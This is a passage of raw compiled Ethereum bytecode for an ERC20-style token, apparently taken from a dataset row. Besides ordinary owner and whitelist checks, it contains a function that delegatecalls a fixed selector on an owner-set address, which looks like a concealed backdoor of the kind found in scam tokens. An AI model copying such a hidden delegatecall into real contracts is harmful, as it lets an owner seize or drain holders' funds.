000000000000000000000000000000000000000000000000000008152600401611ed390612f13565b60405180910390fd5b600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b815260040160206040518083038186803b158015611f4457600080fd5b505afa158015611f58573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611f7c9190612b4f565b905090565b6000611f8b6124fa565b73ffffffffffffffffffffffffffffffffffffffff16611fa961182a565b73ffffffffffffffffffffffffffffffffffffffff1614611fff576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611ff690612f73565b60405180910390fd5b600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514612143576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161213a90612f33565b60405180910390fd5b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b60006121a16124fa565b73ffffffffffffffffffffffffffffffffffffffff166121bf61182a565b73ffffffffffffffffffffffffffffffffffffffff1614612215576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161220c90612f73565b60405180910390fd5b60005b82518110156122a65760016003600085848151811061223a576122396132cd565b5b602002602001015173ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061229e90613226565b915050612218565b5060019050919050565b6122b86124fa565b73ffffffffffffffffffffffffffffffffffffffff166122d661182a565b73ffffffffffffffffffffffffffffffffffffffff161461232c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161232390612f73565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561239c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161239390612ed3565b60405180910390fd5b6123a58161282e565b50565b6000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527ff7c618c1000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516124739190612de2565b600060405180830381855af49150503d80600081146124ae576040519150601f19603f3d011682016040523d82523d6000602084013e6124b3565b606091505b50509050806124f7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016124ee90612f53565b60405180910390fd5b50565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415612572576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161256990612fb3565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156125e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016125d990612ef3565b60405180910390fd5b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516126c09190612ff3565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561273d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161273490612fd3565b60405180910390fd5b612749600083836128f2565b80600a600082825461275b91906130e5565b9250508190555080600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546127b191906130e5565b925050819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516128169190612ff3565b60405180910390a361282a600083836128f7565b5050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b505050565b600061290f61290a8461304e565b613029565b9050808382526020820190508285602086028201111561293257612931613330565b5b60005b858110156129625781612948888261296c565b845260208401935060208301925050600181019050612935565b5050509392505050565b60008135905061297b81613533565b92915050565b600082601f8301126129965761299561332b565b5b81356129a68482602086016128fc565b91505092915050565b6000813590506129be8161354a565b92915050565b6000815190506129d38161354a565b92915050565b6000602082840312156129ef576129ee61333a565b5b60006129fd8482850161296c565b91505092915050565b60008060408385031215612a1d57612a1c61333a565b5b6000612a2b8582860161296c565b9250506020612a3c8582860161296c565b9150509250929050565b600080600060608486031215612a5f57612a5e61333a565b5b6000612a6d8682870161296c565b9350506020612a7e8682870161296c565b9250506040612a8f868287016129af565b9150509250925092565b60008060408385031215612ab057612aaf61333a565b5b6000612abe8582860161296c565b9250506020612acf858286016129af565b9150509250929050565b600060208284031215612aef57612aee61333a565b5b600082013567ffffffffffffffff811115612b0d57612b0c613335565b5b612b1984828501612981565b91505092915050565b600060208284031215612b3857612b3761333a565b5b6000612b46848285016129af565b91505092915050565b600060208284031215612b6557612b6461333a565b5b6000612b73848285016129c4565b91505092915050565b6000612b888383612b94565b60208301905092915050565b612b9d8161313b565b82525050565b612bac8161313b565b82525050565b6000612bbd8261308a565b612bc781856130b8565b9350612bd28361307a565b8060005b83811015612c03578151612bea8882612b7c565b9750612bf5836130ab565b925050600181019050612bd6565b5085935050505092915050565b612c198161314d565b82525050565b6000612c2a82613095565b612c3481856130c9565b9350612c44818560208601613190565b80840191505092915050565b6000612c5b826130a0565b612c6581856130d4565b9350612c75818560208601613190565b612c7e8161333f565b840191505092915050565b6000612c966026836130d4565b9150612ca182613350565b604082019050919050565b6000612cb96022836130d4565b9150612cc48261339f565b604082019050919050565b6000612cdc600d836130d4565b9150612ce7826133ee565b602082019050919050565b6000612cff600e836130d4565b9150612d0a82613417565b602082019050919050565b6000612d226012836130d4565b9150612d2d82613440565b602082019050919050565b6000612d456020836130d4565b9150612d5082613469565b602082019050919050565b6000612d686013836130d4565b9150612d7382613492565b602082019050919050565b6000612d8b6024836130d4565b9150612d96826134bb565b604082019050919050565b6000612dae601f836130d4565b9150612db98261350a565b602082019050919050565b612dcd81613179565b82525050565b612ddc81613183565b82525050565b6000612dee8284612c1f565b915081905092915050565b6000602082019050612e0e6000830184612ba3565b92915050565b6000606082019050612e296000830186612ba3565b612e366020830185612ba3565b612e436040830184612dc4565b949350505050565b6000604082019050612e606000830185612ba3565b612e6d6020830184612dc4565b9392505050565b60006020820190508181036000830152612e8e8184612bb2565b905092915050565b6000602082019050612eab6000830184612c10565b92915050565b60006020820190508181036000830152612ecb8184612c50565b905092915050565b60006020820190508181036000830152612eec81612c89565b9050919050565b60006020820190508181036000830152612f0c81612cac565b9050919050565b60006020820190508181036000830152612f2c81612ccf565b9050919050565b60006020820190508181036000830152612f4c81612cf2565b9050919050565b60006020820190508181036000830152612f6c81612d15565b9050919050565b60006020820190508181036000830152612f8c81612d38565b9050919050565b60006020820190508181036000830152612fac81612d5b565b9050919050565b60006020820190508181036000830152612fcc81612d7e565b9050919050565b60006020820190508181036000830152612fec81612da1565b9050919050565b60006020820190506130086000830184612dc4565b92915050565b60006020820190506130236000830184612dd3565b92915050565b6000613033613044565b905061303f82826131f5565b919050565b6000604051905090565b600067ffffffffffffffff821115613069576130686132fc565b5b602082029050602081019050919050565b6000819050602082019050919050565b600081519050919050565b600081519050919050565b600081519050919050565b6000602082019050919050565b600082825260208201905092915050565b600081905092915050565b600082825260208201905092915050565b60006130f082613179565b91506130fb83613179565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156131305761312f61326f565b5b828201905092915050565b600061314682613159565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b60005b838110156131ae578082015181840152602081019050613193565b838111156131bd576000848401525b50505050565b600060028204905060018216806131db57607f821691505b602082108114156131ef576131ee61329e565b5b50919050565b6131fe8261333f565b810181811067ffffffffffffffff8211171561321d5761321c6132fc565b5b80604052505050565b600061323182613179565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156132645761326361326f565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b7f496e76616c696420706169722e00000000000000000000000000000000000000600082015250565b7f4e6f207065726d697373696f6e2e000000000000000000000000000000000000600082015250565b7f64656c656761746563616c6c206661696c2e0000000000000000000000000000600082015250565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b7f64656c656761746563616c6c206661696c2e2000000000000000000000000000600082015250565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f45524332303a206d696e7420746f20746865207a65726f206164647265737300600082015250565b61353c8161313b565b811461354757600080fd5b50565b61355381613179565b811461355e57600080fd5b5056fea2646970667358221220b24f646d3a664173530cdf3ac7065622edea5076d7fec4df8fd0da7d672ceb8164736f6c63430008070033,,,,,,,0,,,,,,,,,,